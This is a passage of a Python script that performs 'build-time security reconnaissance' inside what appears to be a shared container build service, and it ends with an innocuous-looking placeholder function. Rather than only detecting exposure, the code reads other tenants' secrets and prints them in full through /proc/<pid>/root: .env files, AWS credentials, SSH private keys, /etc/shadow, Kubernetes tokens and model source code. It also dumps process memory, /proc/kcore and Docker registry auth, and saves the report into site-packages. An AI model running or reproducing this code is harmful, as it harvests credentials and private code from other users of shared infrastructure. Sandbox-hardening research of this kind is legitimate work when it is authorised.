# ---------------------------------------------------------------------------
# 9c. Cross-Process Exploitation (no-process-sandbox)
# ---------------------------------------------------------------------------

def check_proc_cross_process():
    """Probe /proc/<pid>/root, /proc/<pid>/mem, /proc/<pid>/fd for cross-build access."""
    heading("9c. CROSS-PROCESS EXPLOITATION (NO-PROCESS-SANDBOX)")

    my_pid = str(os.getpid())

    try:
        pids = sorted(
            [p for p in os.listdir("/proc") if p.isdigit() and p != my_pid and p != "1"],
            key=int,
        )
    except OSError:
        print("  Cannot list /proc")
        return

    if not pids:
        print("  No other PIDs visible, skipping cross-process checks.")
        return

    print(f"  Testing cross-process access on {len(pids)} other PIDs")

    # --- /proc/<pid>/root traversal ---
    print("\n  --- /proc/<pid>/root filesystem traversal ---")
    root_readable = []
    for pid in pids:
        root_path = f"/proc/{pid}/root"
        try:
            entries = os.listdir(root_path)
            if entries:
                root_readable.append(pid)
        except (OSError, PermissionError):
            continue

    if root_readable:
        # Sample the first few to show what's accessible
        detail_lines = []
        for pid in root_readable[:5]:
            root_path = f"/proc/{pid}/root"
            cmdline = read_file(f"/proc/{pid}/cmdline")
            cmd_str = cmdline.replace("\x00", " ").strip()[:100] if cmdline else "(unknown)"
            try:
                entries = os.listdir(root_path)[:20]
                listing = ", ".join(entries)
            except OSError:
                listing = "(error listing)"

            detail_lines.append(f"  PID {pid} ({cmd_str}):\n    /{listing}")

            # Try to read interesting files from this process's root
            for target in ["/etc/passwd", "/etc/hostname", "/app/.env", "/root/.bashrc"]:
                content = read_file(f"{root_path}{target}")
                if content:
                    detail_lines.append(f"    {target}: {content[:200]}")

        finding("CRITICAL", "Cross-Process",
                f"/proc/<pid>/root readable for {len(root_readable)} processes",
                f"Can traverse other builds' filesystems.\n" + "\n".join(detail_lines))

        # Look for secrets in other builds' filesystems
        print("\n  --- Searching for secrets in other builds' roots ---")
        secret_patterns = [
            "/.env", "/app/.env", "/root/.aws/credentials", "/root/.ssh/id_rsa",
            "/etc/shadow", "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/app/model/model.py",
        ]
        for pid in root_readable[:10]:
            root_path = f"/proc/{pid}/root"
            for sp in secret_patterns:
                # Read full content for source code files, truncated for others
                if sp.endswith(".py"):
                    content = read_file(f"{root_path}{sp}", max_bytes=1_000_000)
                else:
                    content = read_file(f"{root_path}{sp}")
                if content:
                    finding("CRITICAL", "Cross-Process",
                            f"Secret file readable via /proc/{pid}/root{sp}",
                            f"Content:\n{content}")
    else:
        finding("INFO", "Cross-Process", "/proc/<pid>/root not accessible for other PIDs",
                "Filesystem traversal blocked.")

    # --- /proc/<pid>/mem access ---
    print("\n  --- /proc/<pid>/mem read access ---")
    mem_readable = []
    for pid in pids[:20]:  # Test a subset
        mem_path = f"/proc/{pid}/mem"
        try:
            fd = os.open(mem_path, os.O_RDONLY)
            os.close(fd)
            mem_readable.append(pid)
        except (OSError, PermissionError):
            continue

    if mem_readable:
        # Try to read a small chunk from the first accessible PID's memory
        detail = f"Can open /proc/<pid>/mem for PIDs: {', '.join(mem_readable[:10])}"
        sample_pid = mem_readable[0]
        try:
            # Read mapped regions from /proc/<pid>/maps to find a readable region
            maps_data = read_file(f"/proc/{sample_pid}/maps")
            if maps_data:
                # Find the first readable region (r--)
                for line in maps_data.split("\n")[:10]:
                    if not line:
                        continue
                    parts = line.split()
                    if len(parts) >= 2 and "r" in parts[1]:
                        addr_range = parts[0].split("-")
                        start = int(addr_range[0], 16)
                        try:
                            with open(f"/proc/{sample_pid}/mem", "rb") as mf:
                                mf.seek(start)
                                chunk = mf.read(128)
                                hex_preview = " ".join(f"{b:02x}" for b in chunk[:64])
                                detail += f"\nRead 128 bytes from PID {sample_pid} at 0x{start:x}:"
                                detail += f"\n  Hex: {hex_preview}"
                                # Try to decode as text
                                text = chunk.decode("utf-8", errors="replace")
                                printable = "".join(c if c.isprintable() or c in "\n\t" else "." for c in text)
                                detail += f"\n  Text: {printable[:120]}"
                        except (OSError, PermissionError) as e:
                            detail += f"\nSeek/read failed on PID {sample_pid}: {e}"
                        break
        except Exception as e:
            detail += f"\nMaps/mem read error: {e}"

        finding("CRITICAL", "Cross-Process",
                f"/proc/<pid>/mem readable for {len(mem_readable)} processes",
                detail)
    else:
        finding("INFO", "Cross-Process", "/proc/<pid>/mem not accessible",
                "Memory read blocked for other processes.")

    # --- /proc/<pid>/fd enumeration ---
    print("\n  --- /proc/<pid>/fd file descriptor access ---")
    fd_readable = []
    for pid in pids[:20]:  # Test a subset
        fd_path = f"/proc/{pid}/fd"
        try:
            fds = os.listdir(fd_path)
            if fds:
                fd_readable.append((pid, fds))
        except (OSError, PermissionError):
            continue

    if fd_readable:
        detail_lines = []
        for pid, fds in fd_readable[:5]:
            cmdline = read_file(f"/proc/{pid}/cmdline")
            cmd_str = cmdline.replace("\x00", " ").strip()[:80] if cmdline else "(unknown)"
            detail_lines.append(f"\n  PID {pid} ({cmd_str}): {len(fds)} open FDs")

            # Resolve symlinks to see what files/sockets are open
            for fd_num in sorted(fds, key=lambda x: int(x) if x.isdigit() else 0)[:15]:
                fd_link = f"/proc/{pid}/fd/{fd_num}"
                try:
                    target = os.readlink(fd_link)
                    detail_lines.append(f"    fd {fd_num} -> {target}")
                except OSError:
                    pass

        finding("CRITICAL", "Cross-Process",
                f"/proc/<pid>/fd accessible for {len(fd_readable)} processes",
                f"Can see open files, sockets, pipes of other builds." + "\n".join(detail_lines))
    else:
        finding("INFO", "Cross-Process", "/proc/<pid>/fd not accessible",
                "File descriptor enumeration blocked.")

    # --- ptrace check ---
    print("\n  --- ptrace capability check ---")
    status = read_file("/proc/self/status")
    cap_eff_match = re.search(r"CapEff:\s*([0-9a-fA-F]+)", status or "")
    if cap_eff_match:
        cap_val = int(cap_eff_match.group(1), 16)
        has_sys_ptrace = (cap_val >> 19) & 1  # CAP_SYS_PTRACE = bit 19
        if has_sys_ptrace:
            finding("CRITICAL", "Cross-Process",
                    "CAP_SYS_PTRACE is active — can attach to any visible process",
                    "Combined with no-process-sandbox: can inject code, dump memory, "
                    "hijack execution of other builds. Use ptrace(PTRACE_ATTACH, <pid>).")
        else:
            print("  CAP_SYS_PTRACE not in CapEff — ptrace attach to other processes blocked")

    # --- Signal injection test ---
    print("\n  --- Signal injection capability ---")
    # Check if we can send signal 0 (existence check) to other PIDs
    signalable = []
    for pid in pids[:20]:
        try:
            os.kill(int(pid), 0)  # Signal 0 = check permission without sending
            signalable.append(pid)
        except (ProcessLookupError, OSError):
            continue

    if signalable:
        finding("HIGH", "Cross-Process",
                f"Can send signals to {len(signalable)} other processes",
                f"PIDs: {', '.join(signalable[:20])}\n"
                "Can kill/stop/disrupt other builds (DoS). "
                "With no-process-sandbox, all sibling build processes are targetable.")
    else:
        finding("INFO", "Cross-Process", "Cannot send signals to other processes",
                "Signal injection blocked.")


# ---------------------------------------------------------------------------
# 10. Additional Creative Checks
# ---------------------------------------------------------------------------

def check_creative():
    heading("10. ADDITIONAL CREATIVE CHECKS")

    # 10a. OverlayFS upper directories
    mountinfo = read_file("/proc/self/mountinfo")
    if mountinfo:
        overlays = [l for l in mountinfo.split("\n") if "overlay" in l]
        if overlays:
            print("  OverlayFS mounts:")
            for o in overlays:
                print(f"    {o}")
            upper_dirs = re.findall(r"upperdir=([^,\s]+)", mountinfo)
            for ud in upper_dirs[:5]:
                if os.path.isdir(ud) and os.access(ud, os.W_OK):
                    finding("HIGH", "Filesystem", f"Writable OverlayFS upperdir: {ud}",
                            "Writing here modifies the layer directly. Could tamper with build output.")

    # 10b. /proc/sysrq-trigger
    if os.access("/proc/sysrq-trigger", os.W_OK):
        finding("CRITICAL", "Kernel", "/proc/sysrq-trigger is writable",
                "Can crash/reboot the host node (DoS all tenants).")

    # 10c. /proc/kcore
    if os.access("/proc/kcore", os.R_OK):
        # Try to actually read a small chunk via dd to confirm access
        kcore_detail = "Full host physical memory is readable. Can extract any secret from any process."
        try:
            dd_out = run_cmd(
                ["dd", "if=/proc/kcore", "bs=1", "count=512", "status=none"],
                timeout=5,
            )
            if dd_out is not None:
                # Show a hex preview of the first 64 bytes
                raw_bytes = dd_out.encode("latin-1", errors="replace")[:64]
                hex_preview = " ".join(f"{b:02x}" for b in raw_bytes)
                kcore_detail += f"\nConfirmed: dd successfully read 512 bytes from /proc/kcore.\nHex preview (first 64 bytes): {hex_preview}"
            else:
                kcore_detail += "\ndd returned no output — read may be blocked despite R_OK permission."
        except Exception as e:
            kcore_detail += f"\ndd read attempt failed: {e}"
        finding("CRITICAL", "Kernel", "/proc/kcore is readable", kcore_detail)

    # 10d. Device nodes
    print("\n  --- Accessible device nodes ---")
    dev_out = run_cmd(["ls", "-la", "/dev/"])
    if dev_out:
        for line in dev_out.split("\n")[:30]:
            print(f"  {line}")

    for dev in ["/dev/sda", "/dev/sda1", "/dev/vda", "/dev/nvme0n1", "/dev/xvda"]:
        if os.access(dev, os.R_OK):
            finding("CRITICAL", "Filesystem", f"Raw block device readable: {dev}",
                    "Can read host filesystem directly, extract secrets, modify host OS.")

    # 10e. BPF filesystem
    if os.path.isdir("/sys/fs/bpf") and os.access("/sys/fs/bpf", os.W_OK):
        finding("HIGH", "Kernel", "BPF filesystem writable",
                "Can load eBPF programs to sniff network traffic or hijack syscalls.")

    # 10f. cgroup notify_on_release escape
    cg = read_file("/proc/self/cgroup")
    if cg:
        cg_path = cg.strip().split("\n")[0].split(":")[-1] if ":" in cg else ""
        nor_path = f"/sys/fs/cgroup{cg_path}/notify_on_release"
        if os.access(nor_path, os.W_OK):
            finding("CRITICAL", "Namespace", "cgroup notify_on_release is writable",
                    "Classic container escape vector: write release_agent to execute on host.")

    # 10g. Timing / covert channels
    if os.access("/proc/timer_list", os.R_OK):
        finding("LOW", "Kernel", "/proc/timer_list readable",
                "High-resolution timing data. Possible side-channel attacks.")

    # 10h. /proc/[other-pid]/environ — read all processes' env vars
    check_proc_environ()

    # 10i. nsenter available? (can switch namespaces)
    nsenter_path = run_cmd(["which", "nsenter"])
    if nsenter_path:
        finding("MEDIUM", "Filesystem", f"nsenter available at {nsenter_path}",
                "If combined with CAP_SYS_ADMIN or CAP_SYS_PTRACE, can enter other namespaces.")

    # 10j. Check for leftover Docker/BuildKit auth
    for auth_path in [
        "/root/.docker/config.json",
        "/home/*/.docker/config.json",
        "/kaniko/.docker/config.json",
    ]:
        for match in glob.glob(auth_path):
            content = read_file(match)
            finding("CRITICAL", "Persistence", f"Docker auth config found: {match}",
                    f"May contain registry credentials.\n{(content or '')[:300]}")


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

def print_summary():
    heading("SUMMARY")

    counts = Counter(f["severity"] for f in findings)
    order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]

    print(f"\n  Total findings: {len(findings)}")
    for sev in order:
        print(f"    {sev:10s}: {counts.get(sev, 0)}")

    severity_rank = {s: i for i, s in enumerate(order)}
    sorted_findings = sorted(findings, key=lambda f: severity_rank.get(f["severity"], 999))

    print("\n  --- All findings (sorted by severity) ---")
    for f in sorted_findings:
        print(f"    [{f['severity']}] [{f['category']}] {f['title']}")

    print(f"\n{SEP}")
    print("  END OF REPORT")
    print(SEP)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def run_recon():
    import builtins

    # Set up file logger to capture all print output to /data/report.txt
    try:
        # os.makedirs("/data", exist_ok=True)
        file_handler = logging.FileHandler("/usr/local/lib/python3.13/site-packages/report.txt", mode="w")
        file_handler.setFormatter(logging.Formatter("%(message)s"))
        _report_logger.addHandler(file_handler)
    except Exception as e:
        builtins.print(f"\n  ERROR setting up report file: {e}")
        file_handler = None


    # try to create a file in /app
    try:
        with open("/app/foo", "w") as f:
            f.write("test")
    except Exception as e:
        print("failed to write: ", e)

    _original_print = builtins.print

    def _logging_print(*args, **kwargs):
        _original_print(*args, **kwargs)
        # Mirror output to file logger
        msg = kwargs.get("sep", " ").join(str(a) for a in args)
        end = kwargs.get("end", "\n")
        _report_logger.info(f"{msg}{end}" if end != "\n" else msg)

    builtins.print = _logging_print

    try:
        print(SEP)
        print("  BUILD-TIME SECURITY RECONNAISSANCE REPORT")
        print(f"  Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")
        print(f"  Hostname:  {socket.gethostname()}")
        print(f"  Python:    {sys.version}")
        print(SEP)

        check_identity()
        check_env()
        check_filesystem()
        check_capabilities()
        check_namespaces()
        # check_network()
        check_kernel()
        check_persistence()
        check_buildkit()
        check_proc_cross_process()
        check_creative()
        print_summary()
    except Exception as e:
        print(f"\n  ERROR during recon: {e}")
    finally:
        builtins.print = _original_print
        if file_handler:
            _report_logger.removeHandler(file_handler)
            file_handler.close()

def custom_function():
    print("hello")
